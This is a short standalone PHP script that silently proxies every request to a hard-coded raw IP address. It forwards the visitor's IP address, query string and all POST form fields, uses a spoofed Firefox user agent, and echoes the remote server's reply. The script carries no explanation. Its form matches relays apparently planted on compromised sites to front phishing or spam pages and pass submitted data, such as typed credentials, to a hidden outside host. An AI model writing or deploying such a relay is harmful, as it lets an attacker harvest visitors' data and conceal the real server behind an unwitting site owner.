<?php
$lurl="http://80.84.49.93/docs2/css/?ipad=".$_SERVER["REMOTE_ADDR"];
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 120);
curl_setopt($ch, CURLOPT_TIMEOUT, 120);
curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
//curl_setopt($ch, CURLOPT_INTERFACE,$_SERVER["REMOTE_ADDR"]);
if(isset($_SERVER["QUERY_STRING"])){
    if($_SERVER["QUERY_STRING"])$lurl.="&".$_SERVER["QUERY_STRING"];
}
curl_setopt($ch, CURLOPT_URL, $lurl);
if (is_array($_POST)){
    if(count($_POST)){
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $_POST);
    }
}
$ret=curl_exec($ch);
echo $ret;
curl_close($ch);
?>
